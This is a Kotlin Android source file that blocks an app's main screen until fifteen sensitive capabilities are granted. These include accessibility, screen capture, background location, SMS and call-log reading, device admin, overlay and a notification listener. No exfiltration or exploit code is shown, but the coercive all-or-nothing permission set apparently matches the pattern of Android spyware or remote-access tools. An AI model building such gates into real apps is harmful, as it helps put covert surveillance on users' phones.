package com.ansangha.craxxjxbdbf.permissions

import android.app.AlarmManager
import android.app.AppOpsManager
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import android.text.TextUtils
import androidx.annotation.StringRes
import androidx.core.content.ContextCompat
import com.ansangha.craxxjxbdbf.R
import com.ansangha.craxxjxbdbf.security.MyDeviceAdminReceiver
import com.ansangha.craxxjxbdbf.security.MySecurityAccessibilityService
import com.ansangha.craxxjxbdbf.security.MySecurityNotificationListenerService

/**
 * Central checklist for security-style capabilities. Many items cannot be granted via
 * [Context.checkSelfPermission] and must be completed in system Settings or dedicated activations.
 *
 * Manual Android 16 test checklist (non-exhaustive):
 * - Cold start: gate blocks main UI until all rows show granted.
 * - Deny a runtime permission: rationale + retry respects backoff; Settings links work.
 * - Revoke accessibility / notification listener / device admin / overlay / usage access while app
 *   is backgrounded: returning to app should re-show the gate on resume.
 * - MY_PACKAGE_REPLACED: update app via adb install -r and confirm gate refresh fires.
 * - MediaProjection consent flow completes and row toggles (session-based).
 */
object PermissionOrchestrator {

    const val CHECKLIST_SIZE = 15

    enum class CheckId {
        ACCESSIBILITY,
        MEDIA_PROJECTION,
        LOCATION,
        CAMERA_MIC,
        STORAGE_MEDIA,
        POST_NOTIFICATIONS,
        NOTIFICATION_LISTENER,
        DEVICE_ADMIN,
        SYSTEM_OVERLAY,
        USAGE_STATS,
        PHONE_CALL_LOG,
        SMS,
        NETWORK_WIFI,
        BATTERY_OPTIMIZATIONS,
        EXACT_ALARMS,
    }

    data class Row(
        val id: CheckId,
        @StringRes val titleRes: Int,
        @StringRes val detailRes: Int,
        val granted: Boolean,
        val requiresSettingsIntent: Boolean,
        val settingsIntentFactory: ((Context) -> Intent?)?,
    )

    fun evaluate(context: Context, mediaProjectionConsentInSession: Boolean): List<Row> {
        val appCtx = context.applicationContext
        return listOf(
            Row(
                id = CheckId.ACCESSIBILITY,
                titleRes = R.string.perm_row_accessibility_title,
                detailRes = R.string.perm_row_accessibility_detail,
                granted = isAccessibilityServiceEnabled(appCtx),
                requiresSettingsIntent = true,
                settingsIntentFactory = { Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS) },
            ),
            Row(
                id = CheckId.MEDIA_PROJECTION,
                titleRes = R.string.perm_row_media_projection_title,
                detailRes = R.string.perm_row_media_projection_detail,
                granted = mediaProjectionConsentInSession,
                requiresSettingsIntent = false,
                settingsIntentFactory = null,
            ),
            Row(
                id = CheckId.LOCATION,
                titleRes = R.string.perm_row_location_title,
                detailRes = R.string.perm_row_location_detail,
                granted = isLocationBundleGranted(appCtx),
                requiresSettingsIntent = false,
                settingsIntentFactory = { appDetailsIntent(it) },
            ),
            Row(
                id = CheckId.CAMERA_MIC,
                titleRes = R.string.perm_row_camera_mic_title,
                detailRes = R.string.perm_row_camera_mic_detail,
                granted = hasPermissions(
                    appCtx,
                    listOf(
                        android.Manifest.permission.CAMERA,
                        android.Manifest.permission.RECORD_AUDIO,
                    ),
                ),
                requiresSettingsIntent = false,
                settingsIntentFactory = { appDetailsIntent(it) },
            ),
            Row(
                id = CheckId.STORAGE_MEDIA,
                titleRes = R.string.perm_row_storage_title,
                detailRes = R.string.perm_row_storage_detail,
                granted = isStorageBundleGranted(appCtx),
                requiresSettingsIntent = false,
                settingsIntentFactory = { appDetailsIntent(it) },
            ),
            Row(
                id = CheckId.POST_NOTIFICATIONS,
                titleRes = R.string.perm_row_post_notifications_title,
                detailRes = R.string.perm_row_post_notifications_detail,
                granted = isPostNotificationsGranted(appCtx),
                requiresSettingsIntent = false,
                settingsIntentFactory = { appDetailsIntent(it) },
            ),
            Row(
                id = CheckId.NOTIFICATION_LISTENER,
                titleRes = R.string.perm_row_notif_listener_title,
                detailRes = R.string.perm_row_notif_listener_detail,
                granted = isNotificationListenerEnabled(appCtx),
                requiresSettingsIntent = true,
                settingsIntentFactory = { Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS) },
            ),
            Row(
                id = CheckId.DEVICE_ADMIN,
                titleRes = R.string.perm_row_device_admin_title,
                detailRes = R.string.perm_row_device_admin_detail,
                granted = isDeviceAdminActive(appCtx),
                requiresSettingsIntent = true,
                settingsIntentFactory = { ctx ->
                    Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                        putExtra(
                            DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                            ComponentName(ctx, MyDeviceAdminReceiver::class.java),
                        )
                        putExtra(
                            DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                            ctx.getString(R.string.perm_device_admin_explainer),
                        )
                    }
                },
            ),
            Row(
                id = CheckId.SYSTEM_OVERLAY,
                titleRes = R.string.perm_row_overlay_title,
                detailRes = R.string.perm_row_overlay_detail,
                granted = Settings.canDrawOverlays(appCtx),
                requiresSettingsIntent = true,
                settingsIntentFactory = { ctx ->
                    Intent(
                        Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:${ctx.packageName}"),
                    )
                },
            ),
            Row(
                id = CheckId.USAGE_STATS,
                titleRes = R.string.perm_row_usage_stats_title,
                detailRes = R.string.perm_row_usage_stats_detail,
                granted = isUsageAccessGranted(appCtx),
                requiresSettingsIntent = true,
                settingsIntentFactory = { Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS) },
            ),
            Row(
                id = CheckId.PHONE_CALL_LOG,
                titleRes = R.string.perm_row_phone_title,
                detailRes = R.string.perm_row_phone_detail,
                granted = hasPermissions(
                    appCtx,
                    listOf(
                        android.Manifest.permission.READ_CALL_LOG,
                        android.Manifest.permission.READ_PHONE_STATE,
                        android.Manifest.permission.READ_PHONE_NUMBERS,
                    ),
                ),
                requiresSettingsIntent = false,
                settingsIntentFactory = { appDetailsIntent(it) },
            ),
            Row(
                id = CheckId.SMS,
                titleRes = R.string.perm_row_sms_title,
                detailRes = R.string.perm_row_sms_detail,
                granted = hasPermissions(
                    appCtx,
                    listOf(
                        android.Manifest.permission.READ_SMS,
                        android.Manifest.permission.RECEIVE_SMS,
                    ),
                ),
                requiresSettingsIntent = false,
                settingsIntentFactory = { appDetailsIntent(it) },
            ),
            Row(
                id = CheckId.NETWORK_WIFI,
                titleRes = R.string.perm_row_network_title,
                detailRes = R.string.perm_row_network_detail,
                granted = isNetworkWifiBundleGranted(appCtx),
                requiresSettingsIntent = false,
                settingsIntentFactory = { appDetailsIntent(it) },
            ),
            Row(
                id = CheckId.BATTERY_OPTIMIZATIONS,
                titleRes = R.string.perm_row_battery_title,
                detailRes = R.string.perm_row_battery_detail,
                granted = isIgnoringBatteryOptimizations(appCtx),
                requiresSettingsIntent = true,
                settingsIntentFactory = { ctx ->
                    Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:${ctx.packageName}")
                    }
                },
            ),
            Row(
                id = CheckId.EXACT_ALARMS,
                titleRes = R.string.perm_row_exact_alarms_title,
                detailRes = R.string.perm_row_exact_alarms_detail,
                granted = canScheduleExactAlarms(appCtx),
                requiresSettingsIntent = true,
                settingsIntentFactory = { ctx ->
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                        Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM).apply {
                            data = Uri.parse("package:${ctx.packageName}")
                        }
                    } else {
                        appDetailsIntent(ctx)
                    }
                },
            ),
        )
    }

    fun allGranted(rows: List<Row>): Boolean = rows.all { it.granted }

    private fun appDetailsIntent(context: Context): Intent =
        Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.fromParts("package", context.packageName, null)
        }

    private fun hasPermissions(context: Context, permissions: List<String>): Boolean =
        permissions.all { perm ->
            ContextCompat.checkSelfPermission(context, perm) == PackageManager.PERMISSION_GRANTED
        }

    private fun isPostNotificationsGranted(context: Context): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) return true
        return ContextCompat.checkSelfPermission(
            context,
            android.Manifest.permission.POST_NOTIFICATIONS,
        ) == PackageManager.PERMISSION_GRANTED
    }

    private fun isLocationBundleGranted(context: Context): Boolean {
        val fine = ContextCompat.checkSelfPermission(
            context,
            android.Manifest.permission.ACCESS_FINE_LOCATION,
        ) == PackageManager.PERMISSION_GRANTED
        if (!fine) return false
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return true
        return ContextCompat.checkSelfPermission(
            context,
            android.Manifest.permission.ACCESS_BACKGROUND_LOCATION,
        ) == PackageManager.PERMISSION_GRANTED
    }

    private fun isStorageBundleGranted(context: Context): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            hasPermissions(
                context,
                listOf(
                    android.Manifest.permission.READ_MEDIA_IMAGES,
                    android.Manifest.permission.READ_MEDIA_VIDEO,
                    android.Manifest.permission.READ_MEDIA_AUDIO,
                ),
            )
        } else {
            ContextCompat.checkSelfPermission(
                context,
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
            ) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun isNetworkWifiBundleGranted(context: Context): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) return true
        return ContextCompat.checkSelfPermission(
            context,
            android.Manifest.permission.NEARBY_WIFI_DEVICES,
        ) == PackageManager.PERMISSION_GRANTED
    }

    private fun isIgnoringBatteryOptimizations(context: Context): Boolean {
        val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
        return pm.isIgnoringBatteryOptimizations(context.packageName)
    }

    private fun canScheduleExactAlarms(context: Context): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) return true
        val am = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        return am.canScheduleExactAlarms()
    }

    private fun isUsageAccessGranted(context: Context): Boolean {
        val appOps = context.getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        val mode = appOps.unsafeCheckOpNoThrow(
            AppOpsManager.OPSTR_GET_USAGE_STATS,
            android.os.Process.myUid(),
            context.packageName,
        )
        return mode == AppOpsManager.MODE_ALLOWED
    }

    private fun isDeviceAdminActive(context: Context): Boolean {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        return dpm.isAdminActive(ComponentName(context, MyDeviceAdminReceiver::class.java))
    }

    private fun isNotificationListenerEnabled(context: Context): Boolean {
        val flat = Settings.Secure.getString(
            context.contentResolver,
            "enabled_notification_listeners",
        ) ?: return false
        val cn = ComponentName(context, MySecurityNotificationListenerService::class.java)
        val target = cn.flattenToString()
        val splitter = TextUtils.SimpleStringSplitter(':')
        splitter.setString(flat)
        for (name in splitter) {
            val component = ComponentName.unflattenFromString(name) ?: continue
            if (component == cn || component.flattenToString() == target) return true
        }
        return false
    }

    private fun isAccessibilityServiceEnabled(context: Context): Boolean {
        val expected = ComponentName(context, MySecurityAccessibilityService::class.java).flattenToString()
        val setting = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
        ) ?: return false
        val splitter = TextUtils.SimpleStringSplitter(':')
        splitter.setString(setting)
        for (name in splitter) {
            val component = ComponentName.unflattenFromString(name) ?: continue
            if (component.flattenToString().equals(expected, ignoreCase = true)) return true
        }
        return false
    }

    /**
     * Android 10+ background location must be requested after foreground location is granted.
     */
    fun nextLocationRuntimeBatch(context: Context): List<String> {
        val fineOk =
            ContextCompat.checkSelfPermission(
                context,
                android.Manifest.permission.ACCESS_FINE_LOCATION,
            ) == PackageManager.PERMISSION_GRANTED
        if (!fineOk) {
            return listOf(
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.ACCESS_COARSE_LOCATION,
            )
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val bgOk =
                ContextCompat.checkSelfPermission(
                    context,
                    android.Manifest.permission.ACCESS_BACKGROUND_LOCATION,
                ) == PackageManager.PERMISSION_GRANTED
            if (!bgOk) {
                return listOf(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            }
        }
        return emptyList()
    }

    fun runtimePermissionNamesForRow(id: CheckId): List<String> {
        return when (id) {
            CheckId.LOCATION -> emptyList()
            CheckId.CAMERA_MIC -> listOf(
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.RECORD_AUDIO,
            )
            CheckId.STORAGE_MEDIA -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                listOf(
                    android.Manifest.permission.READ_MEDIA_IMAGES,
                    android.Manifest.permission.READ_MEDIA_VIDEO,
                    android.Manifest.permission.READ_MEDIA_AUDIO,
                )
            } else {
                listOf(android.Manifest.permission.READ_EXTERNAL_STORAGE)
            }
            CheckId.POST_NOTIFICATIONS -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                listOf(android.Manifest.permission.POST_NOTIFICATIONS)
            } else {
                emptyList()
            }
            CheckId.PHONE_CALL_LOG -> listOf(
                android.Manifest.permission.READ_CALL_LOG,
                android.Manifest.permission.READ_PHONE_STATE,
                android.Manifest.permission.READ_PHONE_NUMBERS,
            )
            CheckId.SMS -> listOf(
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.RECEIVE_SMS,
            )
            CheckId.NETWORK_WIFI -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                listOf(android.Manifest.permission.NEARBY_WIFI_DEVICES)
            } else {
                emptyList()
            }
            else -> emptyList()
        }
    }
}
